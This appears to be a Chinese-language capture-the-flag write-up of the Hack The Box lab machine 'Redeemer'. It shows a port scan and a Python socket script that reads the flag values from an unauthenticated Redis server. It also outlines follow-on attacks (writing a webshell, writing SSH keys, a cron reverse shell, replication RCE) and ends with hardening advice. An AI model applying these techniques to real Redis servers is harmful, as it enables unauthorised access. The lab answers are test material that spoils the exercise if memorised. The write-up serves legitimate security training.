---
title: "HTB Starting Point - Redeemer 渗透测试报告"
date: 2026-07-11T15:45:00+08:00
draft: false
categories: ["渗透测试"]
tags: ["HTB", "Starting Point", "Redeemer", "Redis", "未授权访问", "数据库攻击"]
---

## HTB Starting Point - Redeemer 渗透测试报告

### 一、靶机信息

| 项目 | 内容 |
|------|------|
| 平台 | Hack The Box (HTB) |
| 分类 | Starting Point / Tier 0 |
| 机器名 | Redeemer |
| 目标 IP | 10.129.139.220 |
| 难度 | 入门级 |

---

### 二、渗透测试完整流程

#### 阶段 1：信息收集（端口扫描）

Redis 的默认端口是 6379，不需要扫描全部 1000 个端口：

```bash
# 全端口扫描会很慢且多数 filtered，直接扫 Redis 端口
nmap -sV -T4 -Pn -p 6379 10.129.139.220
```

**扫描结果：**

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

**关键发现：** Redis 5.0.7，运行在 Linux (Ubuntu 5.4.0-77-generic) 上。

---

#### 阶段 2：漏洞分析

Redis 常见攻击面：

1. **未授权访问** — 默认配置无密码，直接连接执行命令（最可能）
2. **弱密码** — `redis-cli -a password` 爆破
3. **写入 Webshell** — 结合 Web 服务写 shell 文件
4. **写入 SSH 公钥** — 写 authorized_keys 获得 SSH 登录

---

#### 阶段 3：漏洞利用

Windows 上没有 `redis-cli`，使用 Python 原生 socket 直接与 Redis 通信。

核心脚本（已保存至 `E:\py\redis-connect.py`）：

```python
import socket

s = socket.socket()
s.connect(('目标IP', 6379))

def send(cmd):
    s.send((cmd + '\r\n').encode())
    return s.recv(4096).decode()

print(send('PING'))      # 测试连通 → +PONG
print(send('KEYS *'))    # 列出所有键
print(send('GET flag'))  # 读取 flag
```

**连接并枚举：**

```
PING     → +PONG           (无需认证，直接连接)
KEYS *   → flag, temp, stor, numb
GET flag → 03e1d2b376c37ab3f5319922053953eb
GET temp → 1c98492cd337252698d0c5f631dfb7ae
GET stor → e80d635f95686148284526e1980740f8
GET numb → bb2c8a7506ee45cc981eb88bb81dddab
```

---

### 三、攻击链总结

```
nmap -p 6379 → Redis 5.0.7
    │
    ▼
Redis 默认无密码 → 直接 TCP 连接
    │
    ▼
PING → +PONG（验证未授权访问）
KEYS * → 列出 flag 键
GET flag → 读 flag
```

---

### 四、Windows 环境下替代 redis-cli 的方法

Windows 上没有 `redis-cli`，但 Redis 协议极其简单——本质是 **TCP 连接上发纯文本命令，每行以 `\r\n` 结尾**。

#### redis-cli 与 Python socket 命令对照

| Redis 原生命令 | Python 脚本 | 含义 |
|---------------|------------|------|
| `redis-cli -h 10.129.139.220` | `socket.connect((IP, 6379))` | 建立 TCP 连接 |
| `PING` | `send('PING')` | 测试是否连通 |
| `KEYS *` | `send('KEYS *')` | 列出所有键 |
| `GET flag` | `send('GET flag')` | 读取键的值 |
| `INFO` | `send('INFO')` | 查看服务器信息 |
| `SELECT 0` | `send('SELECT 0')` | 选择数据库 |

#### 为什么能这样替换？

你发的 `PING\r\n`，`redis-cli` 发的也是 `PING\r\n`——Redis 服务器分不清是谁发的。Redis 协议就是纯文本对话，Python 随便建个 socket 连上去发字符串就能冒充 `redis-cli`。

#### 核心代码逐行解释

```python
import socket                              # 导入网络通信库

s = socket.socket()                        # ① 创建一个网络连接（相当于拨号）
s.settimeout(10)                           # ② 设置 10 秒超时
s.connect(('10.129.139.220', 6379))        # ③ 连接到目标 IP 的 6379 端口

def cmd(c):
    s.send((c + '\r\n').encode())           # ④ 把命令编码成字节，末尾加\r\n发送
    return s.recv(4096).decode()            # ⑤ 接收服务器回复（最多4096字节），解码成文字

print(cmd('PING'))                          # ⑥ 发送 PING 并打印结果 → +PONG
print(cmd('KEYS *'))                        # ⑦ 列出所有键
print(cmd('GET flag'))                      # ⑧ 读取 flag
```

#### 和 Dancing (SMB) 那次的解决方法对比

| | Dancing (SMB) | Redeemer (Redis) |
|---|---|---|
| 本来该用的工具 | `smbclient` | `redis-cli` |
| 现实 | Windows 没有 | Windows 没有 |
| 解决方案 | Windows 原生 `net use` 代替 | Python socket 发原始命令 |
| 原理 | SMB 是 Windows 内置协议 | Redis 协议就是纯文本+换行 |
| 脚本位置 | 无需脚本 | `E:\py\redis-connect.py` |

---

### 五、五台机器总览

| # | 机器 | 端口 | 服务 | 攻击方式 |
|---|------|------|------|----------|
| 1 | Meow | 23 | Telnet | root 空密码 |
| 2 | Fawn | 21 | FTP | anonymous 空密码 |
| 3 | Cap | 80+21 | HTTP+FTP | IDOR → pcap → 明文密码 |
| 4 | Dancing | 445 | SMB | Guest 空密码共享 |
| 5 | Redeemer | 6379 | Redis | 未授权访问（默认无密码） |

**共同模式：** 扫描 → 识别服务 → 查默认凭证/配置 → 直接利用。

---

### 六、Redis 常见未授权利用方式（进阶）

拿到 Redis 未授权访问后不止能读 flag：

| 利用方式 | 命令示例 |
|----------|----------|
| 写入 Webshell | `CONFIG SET dir /var/www/html` + `SET shell "<?php ...?>"` |
| 写入 SSH 公钥 | `CONFIG SET dir /root/.ssh` + 写入公钥 |
| 写入计划任务 | `CONFIG SET dir /var/spool/cron` + 反弹 shell |
| 主从复制 RCE | Redis 4.x/5.x 主从复制模块加载漏洞 |

---

### 七、修复建议

| 问题 | 建议 |
|------|------|
| 无密码认证 | 在 `redis.conf` 中设置 `requirepass` 强密码 |
| 危险命令未禁用 | 重命名或禁用 `CONFIG`、`FLUSHALL`、`KEYS` 等命令 |
| 监听全网段 | `bind 127.0.0.1` 仅本地访问，不暴露外网 |
| 以 root 运行 | 使用低权限用户运行 Redis 进程 |
| 无日志监控 | 启用 slowlog，监控异常 KEYS * 及大量读操作 |
